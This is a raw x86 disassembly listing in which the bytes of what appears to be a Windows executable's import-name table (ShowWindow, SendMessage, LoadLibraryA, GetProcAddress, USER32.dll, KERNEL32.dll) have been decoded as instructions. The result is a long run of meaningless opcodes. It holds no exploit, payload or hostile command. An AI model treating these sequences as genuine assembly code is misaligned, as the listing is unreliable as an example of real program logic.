  4286b5:	jo     0x42872c
  4286b7:	jo     0x428706
  4286b9:	outs   dx,BYTE PTR gs:[esi]
  4286bb:	jne    0x4286bd
  4286bd:	add    cl,bl
  4286bf:	add    DWORD PTR [ebp+0x6f],ecx
  4286c2:	outs   dx,BYTE PTR ds:[esi]
  4286c3:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  4286cb:	push   edx
  4286cc:	arpl   WORD PTR gs:[eax+eax*1+0x39],si
  4286d1:	add    BYTE PTR [ebx+0x68],al
  4286d4:	popa   
  4286d5:	jb     0x42872c
  4286d7:	jo     0x428749
  4286d9:	gs jb  0x428733
  4286dc:	add    BYTE PTR [eax],al
  4286de:	add    dl,BYTE PTR ds:[ebx+0x65]
  4286e2:	je     0x428728
  4286e4:	ins    BYTE PTR es:[edi],dx
  4286e5:	addr16 dec ecx
  4286e7:	je     0x42874e
  4286e9:	ins    DWORD PTR es:[edi],dx
  4286ea:	push   esp
  4286eb:	gs js  0x428762
  4286ee:	inc    ecx
  4286ef:	add    BYTE PTR [edx+eax*1+0x53],bh
  4286f3:	push   0x774f776f
  4286f8:	outs   dx,BYTE PTR ds:[esi]
  4286f9:	gs fs push eax
  4286fc:	outs   dx,DWORD PTR ds:[esi]
  4286fd:	jo     0x428774
  4286ff:	jo     0x428774
  428701:	add    BYTE PTR [eax],bl
  428703:	add    dl,BYTE PTR [edx+0x65]
  428706:	ins    DWORD PTR es:[edi],dx
  428707:	outs   dx,DWORD PTR ds:[esi]
  428708:	jbe    0x42876f
  42870a:	push   eax
  42870b:	jb     0x42877c
  42870d:	jo     0x428766
  42870f:	add    BYTE PTR [edi+0x2],bh
  428712:	push   ebx
  428713:	push   0x6957776f
  428718:	outs   dx,BYTE PTR ds:[esi]
  428719:	outs   dx,DWORD PTR fs:[esi]
  42871b:	ja     0x42871d
  42871d:	add    BYTE PTR [ebx],bl
  42871f:	add    BYTE PTR [ebx+0x61],al
  428722:	ins    BYTE PTR es:[edi],dx
  428723:	ins    BYTE PTR es:[edi],dx
  428724:	push   edi
  428725:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  42872c:	outs   dx,DWORD PTR ds:[esi]
  42872d:	arpl   WORD PTR [edi+0x0],dx
  428730:	mov    dh,0x1
  428732:	dec    esp
  428733:	outs   dx,DWORD PTR ds:[esi]
  428734:	popa   
  428735:	fs dec ebp
  428737:	outs   dx,BYTE PTR gs:[esi]
  428739:	jne    0x42877c
  42873b:	add    BYTE PTR [edx+eax*1+0x74697753],al
  428742:	arpl   WORD PTR [eax+0x54],bp
  428745:	outs   dx,DWORD PTR ds:[esi]
  428746:	push   esp
  428747:	push   0x69577369
  42874c:	outs   dx,BYTE PTR ds:[esi]
  42874d:	outs   dx,DWORD PTR fs:[esi]
  42874f:	ja     0x428751
  428751:	add    BYTE PTR [eax],ah
  428753:	add    dl,BYTE PTR [ebx+0x63]
  428756:	jb     0x4287c7
  428758:	ins    BYTE PTR es:[edi],dx
  428759:	ins    BYTE PTR es:[edi],dx
  42875a:	push   edi
  42875b:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  428762:	add    BYTE PTR [eax],al
  428764:	pop    DWORD PTR [eax]
  428766:	inc    esp
  428767:	gs push di
  42876a:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  428771:	outs   dx,DWORD PTR ds:[esi]
  428772:	arpl   WORD PTR [edi+0x0],dx
  428775:	add    BYTE PTR [ecx],dh
  428777:	add    BYTE PTR [ebx+0x68],al
  42877a:	popa   
  42877b:	jb     0x4287cd
  42877d:	jb     0x4287e4
  42877f:	jbe    0x4287d8
  428781:	add    BYTE PTR [edx+eax*1+0x696c6156],ch
  428788:	fs popa 
  42878a:	je     0x4287f1
  42878c:	push   edx
  42878d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  428792:	xor    eax,DWORD PTR [ecx]
  428794:	inc    edi
  428795:	gs je  0x4287e5
  428798:	outs   dx,BYTE PTR gs:[esi]
  42879a:	jne    0x4287e5
  42879c:	je     0x428803
  42879e:	ins    DWORD PTR es:[edi],dx
  42879f:	dec    ecx
  4287a0:	inc    esp
  4287a1:	add    BYTE PTR ds:0x6e655302,ch
  4287a7:	fs dec esi
  4287a9:	outs   dx,DWORD PTR ds:[esi]
  4287aa:	je     0x428815
  4287ac:	data16 jns 0x4287fc
  4287af:	gs jae 0x428825
  4287b2:	popa   
  4287b3:	addr16 gs push edi
  4287b6:	add    BYTE PTR [eax],al
  4287b8:	mov    al,0x1
  4287ba:	dec    esp
  4287bb:	outs   dx,DWORD PTR ds:[esi]
  4287bc:	popa   
  4287bd:	fs dec ecx
  4287bf:	arpl   WORD PTR [edi+0x6e],bp
  4287c2:	push   edi
  4287c3:	add    BYTE PTR [ecx+0x57734901],ah
  4287c9:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  4287d0:	popa   
  4287d1:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  4287d5:	add    BYTE PTR ds:0x74654701,dl
  4287db:	inc    esi
  4287dc:	outs   dx,DWORD PTR ds:[esi]
  4287dd:	jb     0x428844
  4287df:	addr16 jb 0x428851
  4287e2:	jne    0x428852
  4287e4:	fs push edi
  4287e6:	imul   ebp,DWORD PTR [esi+0x64],0x7500776f
  4287ed:	add    DWORD PTR [edi+0x65],eax
  4287f0:	je     0x428849
  4287f2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4287f9:	js     0x42886f
  4287fb:	inc    ecx
  4287fc:	add    BYTE PTR [eax],al
  4287fe:	add    DWORD PTR ds:[edi+0x65],eax
  428802:	je     0x428851
  428804:	gs jae 0x42887a
  428807:	popa   
  428808:	addr16 gs push edi
  42880b:	add    BYTE PTR [ebx],ch
  42880d:	add    dl,BYTE PTR [ebx+0x65]
  428810:	outs   dx,BYTE PTR ds:[esi]
  428811:	fs dec ebp
  428813:	gs jae 0x428889
  428816:	popa   
  428817:	addr16 gs push edi
  42881a:	add    BYTE PTR [eax],al
  42881c:	das    
  42881d:	add    dl,BYTE PTR [ebx+0x65]
  428820:	je     0x428863
  428822:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428826:	gs push edi
  428828:	imul   ebp,DWORD PTR [esi+0x64],0x400776f
  42882f:	add    dl,BYTE PTR [edx+0x65]
  428832:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  42883a:	popa   
  42883b:	jae    0x4288b0
  42883d:	inc    ebp
  42883e:	js     0x428897
  428840:	add    BYTE PTR [eax],al
  428842:	and    DWORD PTR [edx],eax
  428844:	push   ebx
  428845:	outs   dx,BYTE PTR gs:[esi]
  428847:	fs inc esp
  428849:	ins    BYTE PTR es:[edi],dx
  42884a:	addr16 dec ecx
  42884c:	je     0x4288b3
  42884e:	ins    DWORD PTR es:[edi],dx
  42884f:	dec    ebp
  428850:	gs jae 0x4288c6
  428853:	popa   
  428854:	addr16 gs inc ecx
  428857:	add    BYTE PTR ds:0x74654701,bh
  42885d:	dec    ebp
  42885e:	gs jae 0x4288d4
  428861:	popa   
  428862:	addr16 gs push esp
  428865:	imul   ebp,DWORD PTR [ebp+0x65],0x1d0000
  42886c:	inc    ebx
  42886d:	popa   
  42886e:	jae    0x4288d3
  428870:	popa   
  428871:	fs gs push edi
  428874:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  42887b:	add    bh,bl
  42887d:	add    BYTE PTR [ebp+0x78],al
  428880:	imul   esi,DWORD PTR [edi+edx*2+0x69],0x776f646e
  428888:	jae    0x4288cf
  42888a:	js     0x42888c
  42888c:	repnz add DWORD PTR [eax+0x6f],edx
  428890:	jae    0x428906
  428892:	dec    ebp
  428893:	gs jae 0x428909
  428896:	popa   
  428897:	addr16 gs push edi
  42889a:	add    BYTE PTR [eax],al
  42889c:	add    DWORD PTR fs:[edi+0x65],eax
  4288a0:	je     0x4288f7
  4288a2:	jo     0x428908
  4288a4:	popa   
  4288a5:	je     0x42890c
  4288a7:	push   edx
  4288a8:	outs   dx,BYTE PTR ds:[si]
  4288aa:	add    BYTE PTR [eax],al
  4288ac:	mov    BYTE PTR [edx],al
  4288ae:	push   esp
  4288af:	popa   
  4288b0:	bound  esp,QWORD PTR [edx+0x65]
  4288b3:	fs push esp
  4288b5:	gs js  0x42892c
  4288b8:	dec    edi
  4288b9:	jne    0x42892f
  4288bb:	push   edi
  4288bc:	add    BYTE PTR [eax],al
  4288be:	test   eax,0x616f4c01
  4288c3:	fs inc edx
  4288c5:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb8004170
  4288cd:	add    BYTE PTR [edx+esi*2+0x61],al
  4288d1:	ja     0x428926
  4288d3:	je     0x428936
  4288d5:	je     0x42893c
  4288d7:	push   edi
  4288d8:	add    BYTE PTR [eax],al
  4288da:	ja     0x4288dd
  4288dc:	inc    edi
  4288dd:	gs je  0x428937
  4288e0:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4288e7:	js     0x42895d
  4288e9:	dec    esp
  4288ea:	outs   dx,BYTE PTR gs:[esi]
  4288ec:	addr16 je 0x428957
  4288ef:	push   edi
  4288f0:	add    BYTE PTR [eax],al
  4288f2:	cmp    BYTE PTR [eax],al
  4288f4:	inc    ebx
  4288f5:	push   0x70557261
  4288fa:	jo     0x428961
  4288fc:	jb     0x428940
  4288fe:	jne    0x428966
  428900:	push   di
  428902:	add    BYTE PTR [eax],al
  428904:	daa    
  428905:	add    DWORD PTR [edi+0x65],eax
  428908:	je     0x428955
  42890a:	gs jns 0x42896f
  42890d:	outs   dx,DWORD PTR ds:[esi]
  42890e:	popa   
  42890f:	jb     0x428975
  428911:	push   esp
  428912:	jns    0x428984
  428914:	add    BYTE PTR gs:[ebx+0x1],cl
  428918:	inc    edi
  428919:	gs je  0x42896c
  42891c:	jb     0x42898d
  42891e:	jo     0x428977
  428920:	add    BYTE PTR [eax],al
  428922:	dec    ebp
  428923:	add    BYTE PTR [ebx+0x6f],al
  428926:	jo     0x4289a1
  428928:	push   edx
  428929:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  42892e:	sub    eax,0x61684300
  428933:	jb     0x428983
  428935:	gs js  0x4289ac
  428938:	push   edi
  428939:	add    BYTE PTR [eax+0x43734901],dl
  42893f:	push   0x6f4c7261
  428944:	ja     0x4289ab
  428946:	jb     0x428989
  428948:	add    BYTE PTR [eax],al
  42894a:	sub    BYTE PTR [ecx],al
  42894c:	inc    edi
  42894d:	gs je  0x42899c
  428950:	popa   
  428951:	jae    0x4289c7
  428953:	inc    ecx
  428954:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428958:	gs push eax
  42895a:	outs   dx,DWORD PTR ds:[esi]
  42895b:	jo     0x4289d2
  42895d:	jo     0x42895f
  42895f:	add    BYTE PTR [ebx+0x616f4c01],bh
  428965:	fs push ebx
  428967:	je     0x4289db
  428969:	imul   ebp,DWORD PTR [esi+0x67],0x16d0041
  428970:	inc    edi
  428971:	gs je  0x4289cb
  428974:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  42897b:	outs   dx,BYTE PTR ds:[esi]
  42897c:	addr16 push edi
  42897e:	add    BYTE PTR [eax],al
  428980:	leave  
  428981:	add    DWORD PTR [ebp+0x61],ecx
  428984:	jo     0x4289dd
  428986:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  42898d:	imul   ebp,DWORD PTR [esi+0x74],0x350073
  428994:	inc    ebx
  428995:	push   0x6f547261
  42899a:	dec    edi
  42899b:	gs ins DWORD PTR es:[edi],dx
  42899d:	push   edi
  42899e:	add    BYTE PTR [eax],al
  4289a0:	push   ebp
  4289a1:	push   ebx
  4289a2:	inc    ebp
  4289a3:	push   edx
  4289a4:	xor    esi,DWORD PTR [edx]
  4289a6:	cs fs ins BYTE PTR es:[edi],dx
  4289a9:	ins    BYTE PTR es:[edi],dx
  4289aa:	add    BYTE PTR [eax],al
  4289ac:	xchg   edx,eax
  4289ad:	add    edx,DWORD PTR [edx+0x74]
  4289b0:	ins    BYTE PTR es:[edi],dx
  4289b1:	dec    ecx
  4289b2:	outs   dx,BYTE PTR ds:[esi]
  4289b3:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x74536973
  4289bb:	jb     0x428a26
  4289bd:	outs   dx,BYTE PTR ds:[esi]
  4289be:	add    BYTE PTR [bp+0x74],ch
  4289c2:	fs ins BYTE PTR es:[edi],dx
  4289c4:	ins    BYTE PTR es:[edi],dx
  4289c5:	cs fs ins BYTE PTR es:[edi],dx
  4289c8:	ins    BYTE PTR es:[edi],dx
  4289c9:	add    BYTE PTR ds:0x74654702,al
  4289cf:	dec    esp
  4289d0:	outs   dx,DWORD PTR ds:[esi]
  4289d1:	arpl   WORD PTR [ecx+0x6c],sp
  4289d4:	gs dec ecx
  4289d6:	outs   dx,BYTE PTR ds:[esi]
  4289d7:	outs   dx,WORD PTR ds:[esi]
  4289d9:	push   edi
  4289da:	add    BYTE PTR [eax],al
  4289dc:	inc    ebp
  4289dd:	add    al,BYTE PTR [edi+0x65]
  4289e0:	je     0x428a32
  4289e2:	jb     0x428a53
  4289e4:	arpl   WORD PTR [ecx+0x64],ax
  4289e7:	fs jb  0x428a4f
  4289ea:	jae    0x428a5f
  4289ec:	add    BYTE PTR [eax],al
  4289ee:	rol    DWORD PTR [eax],cl
  4289f0:	inc    ebx
  4289f1:	jb     0x428a58
  4289f3:	popa   
  4289f4:	je     0x428a5b
  4289f6:	inc    esi
  4289f7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  4289ff:	outs   dx,BYTE PTR ds:[esi]
  428a00:	addr16 push edi
  428a02:	add    BYTE PTR [eax],al
  428a04:	sub    BYTE PTR [ebx+edx*2],al
  428a07:	gs je  0x428a52
  428a0a:	popa   
  428a0b:	outs   dx,BYTE PTR ds:[esi]
  428a0c:	fs ins BYTE PTR es:[edi],dx
  428a0e:	gs inc ebx
  428a10:	outs   dx,DWORD PTR ds:[esi]
  428a11:	jne    0x428a81
  428a13:	je     0x428a15
  428a15:	add    ah,bl
  428a17:	add    BYTE PTR [ebx+0x72],al
  428a1a:	gs popa 
  428a1c:	je     0x428a83
  428a1e:	dec    ebp
  428a1f:	popa   
  428a20:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  428a28:	pop    DWORD PTR [ecx]
  428a2a:	inc    edi
  428a2b:	gs je  0x428a6f
  428a2e:	je     0x428a9f
  428a30:	ins    DWORD PTR es:[edi],dx
  428a31:	dec    esi
  428a32:	popa   
  428a33:	ins    DWORD PTR es:[edi],dx
  428a34:	gs inc ecx
  428a36:	add    BYTE PTR [eax],al
  428a38:	pusha  
  428a39:	add    al,BYTE PTR [edi+0x65]
  428a3c:	je     0x428a91
  428a3e:	jns    0x428ab3
  428a40:	je     0x428aa7
  428a42:	ins    DWORD PTR es:[edi],dx
  428a43:	push   edi
  428a44:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  428a4b:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  428a52:	jns    0x428a95
  428a54:	add    BYTE PTR [eax],al
  428a56:	aas    
  428a57:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  428a5b:	fs dec esp
  428a5d:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  428a64:	add    BYTE PTR [eax],al
  428a66:	xchg   ecx,eax
  428a67:	add    al,BYTE PTR [edi+0x6c]
  428a6a:	outs   dx,DWORD PTR ds:[esi]
  428a6b:	bound  esp,QWORD PTR [ecx+0x6c]
  428a6e:	inc    ecx
  428a6f:	ins    BYTE PTR es:[edi],dx
  428a70:	ins    BYTE PTR es:[edi],dx
  428a71:	outs   dx,DWORD PTR ds:[esi]
  428a72:	arpl   WORD PTR [eax],ax
  428a74:	xchg   edx,eax
  428a75:	add    al,0x56
  428a77:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  428a7e:	jne    0x428ae5
  428a80:	jb     0x428afb
  428a82:	add    BYTE PTR [eax],al
  428a84:	test   DWORD PTR [ecx],0x46746547
  428a8a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  428a92:	jb     0x428a95
  428a94:	inc    esi
  428a95:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  428a9c:	jne    0x428b10
  428a9e:	arpl   WORD PTR [ebp+0x57],sp
  428aa1:	add    BYTE PTR [eax],bh
  428aa3:	add    ecx,DWORD PTR [ebp+0x6f]
  428aa6:	jbe    0x428b0d
  428aa8:	inc    esi
  428aa9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x52037600
  428ab1:	popa   
  428ab2:	imul   esi,DWORD PTR [ebx+0x65],0x65637845
  428ab9:	jo     0x428b2f
  428abb:	imul   ebp,DWORD PTR [edi+0x6e],0x1920000
  428ac2:	inc    edi
  428ac3:	gs je  0x428b08
  428ac6:	imul   ebp,DWORD PTR [esi+0x61],0x79547972
  428acd:	jo     0x428b34
  428acf:	inc    ecx
  428ad0:	add    BYTE PTR [eax],al
  428ad2:	and    DWORD PTR [ebx+edx*2],eax
  428ad5:	gs je  0x428b1e
  428ad8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  428ae0:	bound  esi,QWORD PTR [ebp+0x74]
  428ae3:	gs jae 0x428b27
  428ae6:	add    BYTE PTR [eax],al
  428ae8:	add    ecx,DWORD PTR ss:[ebp+0x6f]
  428aec:	jbe    0x428b53
  428aee:	inc    esi
  428aef:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xbf004178
  428af7:	add    BYTE PTR [ebx+0x6f],al
  428afa:	jo     0x428b75
  428afc:	inc    esi
  428afd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x51037100
  428b05:	jne    0x428b6c
  428b07:	jb     0x428b82
  428b09:	push   eax
  428b0a:	gs jb  0x428b73
  428b0d:	outs   dx,DWORD PTR ds:[esi]
  428b0e:	jb     0x428b7d
  428b10:	popa   
  428b11:	outs   dx,BYTE PTR ds:[esi]
  428b12:	arpl   WORD PTR [ebp+0x43],sp
  428b15:	outs   dx,DWORD PTR ds:[esi]
  428b16:	jne    0x428b86
  428b18:	je     0x428b7f
  428b1a:	jb     0x428b1c
  428b1c:	sub    DWORD PTR [ebx+edx*2],eax
  428b1f:	gs je  0x428b6a
  428b22:	popa   
  428b23:	outs   dx,BYTE PTR ds:[esi]
  428b24:	fs ins BYTE PTR es:[edi],dx
  428b26:	gs dec ecx
  428b28:	outs   dx,BYTE PTR ds:[esi]
  428b29:	outs   dx,WORD PTR ds:[esi]
  428b2b:	jb     0x428b9a
  428b2d:	popa   
  428b2e:	je     0x428b99
  428b30:	outs   dx,DWORD PTR ds:[esi]
  428b31:	outs   dx,BYTE PTR ds:[esi]
  428b32:	add    BYTE PTR [eax],al
  428b34:	push   ss
  428b35:	add    DWORD PTR [ebp+0x6e],eax
  428b38:	je     0x428b9f
  428b3a:	jb     0x428b7f
  428b3c:	jb     0x428ba7
  428b3e:	je     0x428ba9
  428b40:	arpl   WORD PTR [ecx+0x6c],sp
  428b43:	push   ebx
  428b44:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  428b49:	outs   dx,BYTE PTR ds:[esi]
  428b4a:	add    BYTE PTR [eax],al
  428b4c:	jg     0x428b4f
  428b4e:	inc    esi
  428b4f:	outs   dx,DWORD PTR ds:[esi]
  428b50:	ins    BYTE PTR es:[edi],dx
  428b51:	fs push ebx
  428b53:	je     0x428bc7
  428b55:	imul   ebp,DWORD PTR [esi+0x67],0x4dd0057
  428b5c:	ins    BYTE PTR es:[edi],dx
  428b5d:	jae    0x428bd3
  428b5f:	jb     0x428bcd
  428b61:	outs   dx,BYTE PTR gs:[esi]
  428b63:	inc    ecx
  428b64:	add    BYTE PTR [eax],al
  428b66:	sahf   
  428b67:	add    DWORD PTR [edi+0x65],eax
  428b6a:	je     0x428baf
  428b6c:	outs   dx,DWORD PTR ds:[esi]
  428b6d:	ins    DWORD PTR es:[edi],dx
  428b6e:	ins    DWORD PTR es:[edi],dx
  428b6f:	push   esp
  428b70:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  428b77:	add    BYTE PTR [edx+eax*1+0x47],dh
  428b7b:	gs je  0x428bd2
  428b7e:	push   0x64616572
  428b83:	push   esp
  428b84:	imul   ebp,DWORD PTR [ebp+0x65],0x4b000073
  428b8b:	inc    ebp
  428b8c:	push   edx
  428b8d:	dec    esi
  428b8e:	inc    ebp
  428b8f:	dec    esp
  428b90:	xor    esi,DWORD PTR [edx]
  428b92:	cs fs ins BYTE PTR es:[edi],dx
  428b95:	ins    BYTE PTR es:[edi],dx
  428b96:	add    BYTE PTR [eax],al
  428b98:	mov    dh,0x1
  428b9a:	push   eax
  428b9b:	outs   dx,DWORD PTR ds:[esi]
  428b9c:	ins    BYTE PTR es:[edi],dx
  428b9d:	jns    0x428c06
  428b9f:	outs   dx,DWORD PTR ds:[esi]
  428ba0:	outs   dx,BYTE PTR ds:[esi]
  428ba1:	add    BYTE PTR [ecx+eax*1+0x47],ch
  428ba5:	gs je  0x428bf7
  428ba8:	bound  ebp,QWORD PTR [edx+0x65]
  428bab:	arpl   WORD PTR [edi+edx*2+0x0],si
  428baf:	add    BYTE PTR [ebx+0x6c654400],dh
  428bb5:	gs je  0x428c1d
  428bb8:	inc    esp
  428bb9:	inc    ebx
  428bba:	add    BYTE PTR [eax],al
  428bbc:	rol    DWORD PTR [ecx],1
  428bbe:	push   ebx
  428bbf:	gs ins BYTE PTR es:[edi],dx
  428bc1:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  428bc6:	push   0x65
  428bc8:	arpl   WORD PTR [eax+eax*1+0x0],si
  428bcc:	jmp    0x428bcf
  428bce:	push   ebx
  428bcf:	gs je  0x428c1f
  428bd2:	popa   
  428bd3:	jo     0x428c22
  428bd5:	outs   dx,DWORD PTR ds:[esi]
  428bd6:	fs add BYTE PTR gs:[eax],al
  428bda:	leave  
  428bdb:	add    DWORD PTR [edx+0x6f],edx
  428bde:	jne    0x428c4e
  428be0:	fs push edx
  428be2:	arpl   WORD PTR gs:[eax+eax*1+0x76],si
  428be7:	add    BYTE PTR [edx+0x69],al
  428bea:	je     0x428c2e
  428bec:	ins    BYTE PTR es:[edi],dx
  428bed:	je     0x428bef
  428bef:	add    BYTE PTR [ebx+0x61655201],bh
  428bf5:	ins    BYTE PTR es:[edi],dx
  428bf6:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  428bfd:	je     0x428c73
  428bff:	add    BYTE PTR gs:[eax],al
  428c02:	jge    0x428c05
  428c04:	inc    edi
  428c05:	gs je  0x428c5b
  428c08:	jns    0x428c7d
  428c0a:	je     0x428c71
  428c0c:	ins    DWORD PTR es:[edi],dx
  428c0d:	push   eax
  428c0e:	popa   
  428c0f:	ins    BYTE PTR es:[edi],dx
  428c10:	gs je  0x428c87
  428c13:	gs push ebp
  428c15:	jae    0x428c7c
  428c17:	add    BYTE PTR [eax+0x74654701],cl
  428c1d:	push   esp
  428c1e:	gs js  0x428c95
  428c21:	inc    ebp
  428c22:	js     0x428c98
  428c24:	outs   dx,BYTE PTR gs:[esi]
  428c26:	je     0x428c78
  428c28:	outs   dx,DWORD PTR ds:[esi]
  428c29:	imul   ebp,DWORD PTR [esi+0x74],0x1cb0041
  428c30:	push   ebx
  428c31:	arpl   WORD PTR [ecx+0x6c],sp
  428c34:	gs push esi
  428c36:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  428c3d:	inc    ebp
  428c3e:	js     0x428cb4
  428c40:	inc    ebp
  428c41:	js     0x428c43
  428c43:	add    bh,cl
  428c45:	add    DWORD PTR [ebx+0x65],edx
  428c48:	ins    BYTE PTR es:[edi],dx
  428c49:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  428c4e:	imul   esi,DWORD PTR [eax+0x52],0xfd006e67
  428c55:	add    DWORD PTR [ebx+0x65],edx
  428c58:	je     0x428cae
  428c5a:	gs js  0x428cd1
  428c5d:	inc    ebx
  428c5e:	outs   dx,DWORD PTR ds:[esi]
  428c5f:	ins    BYTE PTR es:[edi],dx
  428c60:	outs   dx,DWORD PTR ds:[esi]
  428c61:	jb     0x428c63
  428c63:	add    BYTE PTR [eax+0x74615001],ch
  428c69:	push   0x65526f54
  428c6e:	imul   ebp,DWORD PTR [bx+0x6e],0x810000
  428c76:	inc    ebx
  428c77:	outs   dx,DWORD PTR ds:[esi]
  428c78:	ins    DWORD PTR es:[edi],dx
  428c79:	bound  ebp,QWORD PTR [ecx+0x6e]
  428c7c:	gs push edx
  428c7e:	outs   dx,BYTE PTR ds:[si]
  428c80:	add    BYTE PTR [eax],al
  428c82:	lods   al,BYTE PTR ds:[esi]
  428c83:	add    BYTE PTR [ebx+0x72],al
  428c86:	gs popa 
  428c88:	je     0x428cef
  428c8a:	push   edx
  428c8b:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428c90:	outs   dx,BYTE PTR ds:[esi]
  428c91:	dec    ecx
  428c92:	outs   dx,BYTE PTR ds:[esi]
  428c93:	imul   esi,DWORD PTR fs:[edx+0x65],0x9a007463
  428c9b:	add    DWORD PTR [ecx+ebp*2+0x6e],ecx
  428c9f:	gs push esp
  428ca1:	outs   dx,DWORD PTR ds:[esi]
  428ca2:	add    BYTE PTR [eax],al
  428ca4:	mov    ds:0x65724300,al
  428ca9:	popa   
  428caa:	je     0x428d11
  428cac:	dec    ecx
  428cad:	inc    ebx
  428cae:	push   edi
  428caf:	add    BYTE PTR [ebp+0x63655201],bh
  428cb5:	je     0x428d0d
  428cb7:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  428cbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428cbf:	add    BYTE PTR [ebx+0x72],al
  428cc2:	gs popa 
  428cc4:	je     0x428d2b
  428cc6:	push   eax
  428cc7:	popa   
  428cc8:	ins    BYTE PTR es:[edi],dx
  428cc9:	gs je  0x428d40
  428ccc:	add    BYTE PTR gs:[edi+0x44],al
  428cd0:	dec    ecx
  428cd1:	xor    esi,DWORD PTR [edx]
  428cd3:	cs fs ins BYTE PTR es:[edi],dx
  428cd6:	ins    BYTE PTR es:[edi],dx
	...
  428cdf:	add    BYTE PTR [edx],ch
  428ce1:	and    BYTE PTR [edx],al
	...
  428cff:	add    BYTE PTR [ebx],bl
  428d01:	lea    eax,[edx]
	...
  428d0f:	add    BYTE PTR [ecx+0x64],ch
  428d12:	js     0x428d7d
  428d14:	outs   dx,DWORD PTR fs:[esi]
  428d16:	arpl   WORD PTR cs:[edi+0x6d],bp
  428d1a:	add    BYTE PTR [ebx+0x65],dl
  428d1d:	je     0x428d60
  428d1f:	outs   dx,BYTE PTR ds:[esi]
  428d20:	arpl   WORD PTR [eax+0x6f],bp
  428d23:	jb     0x428d74
  428d25:	jb     0x428d90
  428d27:	imul   ebp,DWORD PTR [bp+0x61],0x3231406c
  428d2f:	add    BYTE PTR [eax],al
  428d31:	add    BYTE PTR [eax],al
  428d33:	add    BYTE PTR [eax-0x3bfffd7b],ch
  428d39:	test   DWORD PTR [edx],eax
  428d3b:	add    dh,dl
  428d3d:	test   DWORD PTR [edx],eax
  428d3f:	add    al,ch
  428d41:	test   DWORD PTR [edx],eax
  428d43:	add    BYTE PTR [eax],al
  428d45:	xchg   BYTE PTR [edx],al
  428d47:	add    BYTE PTR [esi+eax*4],dl
  428d4a:	add    al,BYTE PTR [eax]
  428d4c:	xchg   BYTE PTR cs:[edx],al
  428d4f:	add    BYTE PTR [eax],al
  428d51:	add    BYTE PTR [eax],al
  428d53:	add    BYTE PTR [eax-0x7a],dl
  428d56:	add    al,BYTE PTR [eax]
  428d58:	outs   dx,BYTE PTR ds:[esi]
  428d59:	xchg   BYTE PTR [edx],al
  428d5b:	add    BYTE PTR [esi+eax*4+0x2],bh
  428d5f:	add    BYTE PTR [edx-0x61fffd7a],cl
  428d65:	xchg   BYTE PTR [edx],al
  428d67:	add    BYTE PTR [esi+eax*4-0x7941fffe],ch
  428d6e:	add    al,BYTE PTR [eax]
  428d70:	rol    BYTE PTR [esi-0x7921fffe],1
  428d76:	add    al,BYTE PTR [eax]
  428d78:	lock xchg BYTE PTR [edx],al
  428d7b:	add    BYTE PTR [edx],al
  428d7d:	xchg   DWORD PTR [edx],eax
  428d7f:	add    BYTE PTR [eax],dl
  428d81:	xchg   DWORD PTR [edx],eax
  428d83:	add    BYTE PTR [esi],bl
  428d85:	xchg   DWORD PTR [edx],eax
  428d87:	add    BYTE PTR [eax],dh
  428d89:	xchg   DWORD PTR [edx],eax
  428d8b:	add    BYTE PTR [edi+eax*4],bh
  428d8e:	add    al,BYTE PTR [eax]
  428d90:	push   edx
  428d91:	xchg   DWORD PTR [edx],eax
  428d93:	add    BYTE PTR [edi+eax*4+0x2],ah
  428d97:	add    BYTE PTR [esi-0x79],dh
  428d9a:	add    al,BYTE PTR [eax]
  428d9c:	add    BYTE PTR [edi-0x786dfffe],0x2
  428da3:	add    BYTE PTR [edx-0x47fffd79],ah
  428da9:	xchg   DWORD PTR [edx],eax
  428dab:	add    ah,al
  428dad:	xchg   DWORD PTR [edx],eax
  428daf:	add    dh,dl
  428db1:	xchg   DWORD PTR [edx],eax
  428db3:	add    ah,ch
  428db5:	xchg   DWORD PTR [edx],eax
  428db7:	add    dh,bh
  428db9:	xchg   DWORD PTR [edx],eax
  428dbb:	add    BYTE PTR [eax+ecx*4],cl
  428dbe:	add    al,BYTE PTR [eax]
  428dc0:	sbb    al,0x88
  428dc2:	add    al,BYTE PTR [eax]
  428dc4:	mov    BYTE PTR cs:[edx],al
  428dc7:	add    BYTE PTR [edx-0x78],al
  428dca:	add    al,BYTE PTR [eax]
  428dcc:	pop    eax
